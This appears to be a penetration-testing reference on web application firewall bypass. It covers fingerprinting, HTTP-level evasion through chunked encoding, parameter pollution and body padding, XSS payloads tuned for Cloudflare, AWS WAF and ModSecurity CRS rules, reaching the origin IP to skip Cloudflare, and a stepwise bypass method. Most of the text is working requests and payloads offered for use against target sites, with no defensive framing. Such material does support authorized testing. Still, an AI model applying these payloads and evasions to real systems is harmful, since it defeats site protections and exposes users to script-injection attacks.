# WAF Bypass Techniques

## Overview

Web Application Firewalls operate at the HTTP layer and apply signature-based or anomaly-based detection. Bypasses target the gap between what the WAF parses and what the backend application parses. This document covers WAF fingerprinting, HTTP-level bypasses, and payload-level bypasses specific to Cloudflare, AWS WAF, and ModSecurity.

---

## 1. WAF Fingerprinting

Before attempting bypasses, identify which WAF is in place and which rule set it runs. Probe the target with known-bad payloads and observe how the block page looks.

### Fingerprinting Methods

```bash
# wafw00f — automated WAF detection
pip3 install wafw00f
wafw00f https://target.com

# Manual: send a payload that most WAFs block and inspect the response
curl -s -o /dev/null -w "%{http_code}" \
  "https://target.com/search?q=<script>alert(1)</script>"

# Identify WAF from response headers
curl -I "https://target.com/" | grep -i -E "server|x-powered|cf-ray|x-amzn|x-sucuri"
```

**Fingerprint indicators:**

| WAF | Tell-tale Signs |
|-----|----------------|
| Cloudflare | `CF-RAY` header; `cloudflare` in `Server`; Cloudflare block page template |
| AWS WAF | `x-amzn-requestid` header; 403 with AWS error XML |
| ModSecurity | `Mod_Security` in Server header (if verbose); OWASP CRS rule IDs in error pages |
| Imperva/Incapsula | `incap_ses` cookie; Imperva block page |
| Akamai | `AkamaiGHost` in `Server`; Akamai reference number in block page |

---

## 2. HTTP Request-Level Bypasses

### Chunked Transfer Encoding

Some WAFs reconstruct chunked request bodies before inspection; others don't:

```http
POST /search HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

b
q=%3Cscript
9
%3Ealert(
2
1)
1
<
9
/script%3E
0

```

### Content-Type Mismatch

WAFs often restrict inspection to specific content types:

```http
POST /api/search HTTP/1.1
Content-Type: application/json
X-Forwarded-For: 127.0.0.1

{"q":"<script>alert(1)</script>"}
```

```bash
# Try non-standard content types that the app still accepts
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded; charset=ibm037
```

### HTTP Parameter Pollution (HPP)

Many WAFs inspect the first occurrence of a parameter; apps may use the last:

```
https://target.com/search?q=safe&q=<script>alert(1)</script>
```

Reverse is also worth testing: some apps use the first value, some concatenate.

### Large Request Body

Some WAFs skip inspection past a certain body size limit:

```bash
# Pad the body before the payload
python3 -c "
import requests
padding = 'A' * 16384
payload = '<script>alert(1)</script>'
requests.post('https://target.com/search',
  data={'garbage': padding, 'q': payload},
  headers={'Content-Type': 'application/x-www-form-urlencoded'})
"
```

---

## 3. Cloudflare Bypass Techniques

Cloudflare's WAF uses managed rulesets and machine-learning-based anomaly detection.

### Payload Techniques (Cloudflare)

```html
<!-- Case and whitespace variants that Cloudflare's managed rules miss -->
<img src=x onerror=alert(1)>         <!-- baseline — likely blocked -->
<img src=x onerror="alert(1)">       <!-- with quotes — test both -->
<img src=x oNeRrOr=alert(1)>         <!-- case variation -->
<svg/onload=alert(1)>                <!-- svg without space -->
<details/open/ontoggle=alert(1)>     <!-- details element -->

<!-- Template literal to bypass alert( keyword -->
<img src=x onerror=alert`1`>

<!-- Concatenation in JS context -->
<img src=x onerror="al"+"ert(1)">

<!-- Unicode in event handler name -->
<img src=x onerror=\u0061lert(1)>
```

### Request Origin Bypass (Cloudflare IP Allowlisting)

If you find the origin server's IP (via DNS history, Certificate Transparency, Shodan):

```bash
# Bypass Cloudflare entirely by hitting origin IP with Host header
curl -H "Host: target.com" "https://ORIGIN_IP/search?q=<script>alert(1)</script>"
```

---

## 4. AWS WAF Bypass Techniques

AWS WAF uses managed rule groups (AWS Managed Rules, third-party rules from Marketplace).

### Payload Techniques (AWS WAF)

```html
<!-- AWS WAF AWSManagedRulesCommonRuleSet — XSS rule bypass attempts -->
<!-- Newline in tag -->
<svg
onload=alert(1)>

<!-- Tab-separated attributes -->
<img	src=x	onerror=alert(1)>

<!-- Unusual event handlers not in AWS rule patterns -->
<video autoplay onplay=alert(1)><source src=x></video>
<details open ontoggle=alert(1)>
```

### JSON Body Bypass (AWS WAF)

AWS WAF inspects JSON body separately from URL parameters:

```bash
# Switch from URL-encoded to JSON body
curl -X POST https://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"<img src=x onerror=alert(1)>"}'
```

---

## 5. ModSecurity (OWASP CRS) Bypass Techniques

ModSecurity with the OWASP Core Rule Set (CRS) is the most common open-source WAF.

### CRS Anomaly Scoring

CRS accumulates an anomaly score across rules. Individual payload fragments may score below the block threshold while still being effective:

```bash
# Spread the payload across multiple parameters (each scores less)
?a=<img&b=src=x&c=onerror=alert(1)>
# note: depends on app concatenating parameters before processing
```

### ModSecurity CRS Bypass Payloads

```html
<!-- Rule 941100 (XSS Attack Detected via libinjection) bypass -->
<details/open/ontoggle=alert(1)>

<!-- Rule 941110 (XSS Filter Bypass) bypass -->
<svg><script>alert(1)</script></svg>

<!-- Encoding bypass — CRS decodes less aggressively than browsers -->
<img src=x onerror=&#x61;lert(1)>

<!-- Comment injection to break CRS pattern matching -->
<img src=x <!----> onerror=alert(1)>
```

### Paranoia Level Considerations

CRS paranoia levels 1–4 apply progressively more rules. Most deployments run PL1 or PL2. Test with increasingly complex payloads to determine which rules are active.

---

## 6. Bypass Methodology

```
1. Fingerprint the WAF (wafw00f, response headers, block page analysis)
2. Identify which rule set and version (check CVEs for that version)
3. Establish a baseline: which simple payloads are blocked? (e.g., <script>alert(1)</script>)
4. Test HTTP-level bypasses first (chunked, HPP, size-based)
5. Systematically apply payload-level bypasses in order:
   a. Case variation
   b. Whitespace/tab injection
   c. Alternative tags/event handlers
   d. Encoding chains (entities, URL encoding, Unicode)
   e. Protocol obfuscation (javascript: variants)
6. Combine multiple techniques when individual bypasses are blocked
7. Document each WAF rule ID that triggers (if visible) for targeted bypass
```

---

## References

- [OWASP ModSecurity Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/)
- [Cloudflare WAF Managed Rules Documentation](https://developers.cloudflare.com/waf/managed-rules/)
- [AWS WAF Managed Rules](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html)
- [WAF Bypass Techniques — 0xInfection](https://github.com/0xInfection/Awesome-WAF)
- [wafw00f GitHub](https://github.com/EnableSecurity/wafw00f)
